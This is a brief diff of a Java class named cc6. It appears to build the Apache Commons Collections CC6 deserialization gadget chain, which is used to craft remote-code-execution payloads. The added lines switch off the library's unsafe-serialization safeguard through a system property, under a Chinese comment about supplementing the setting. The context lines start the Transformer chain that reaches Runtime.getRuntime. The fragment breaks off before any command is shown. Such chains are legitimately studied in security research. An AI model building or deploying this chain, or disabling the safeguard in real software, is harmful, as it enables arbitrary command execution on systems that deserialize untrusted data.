@@ -14,6 +14,8 @@ import java.util.Map;
 
 public class cc6 {
     public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
+        //补充安全省略设置
+        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
